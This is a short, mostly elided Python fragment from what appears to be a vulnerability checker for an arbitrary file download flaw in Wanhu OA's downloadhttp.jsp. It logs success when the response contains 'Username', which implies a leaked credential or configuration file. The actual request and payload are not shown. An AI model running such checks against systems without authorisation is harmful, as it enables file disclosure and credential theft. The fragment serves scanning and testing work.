...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测万户OA downloadhttp.jsp 任意文件下载漏洞")
    try:
        ...
        if respones.status_code == 200 and 'Username' in respones.text:
            print(now_time() + ' [SUCCESS]  万户OA downloadhttp.jsp 任意文件下载漏洞存在{}'.format(exp_url))
        else:
            print(now_time() + ' [WARNING]  万户OA downloadhttp.jsp 任意文件下载漏洞不存在')
    except:
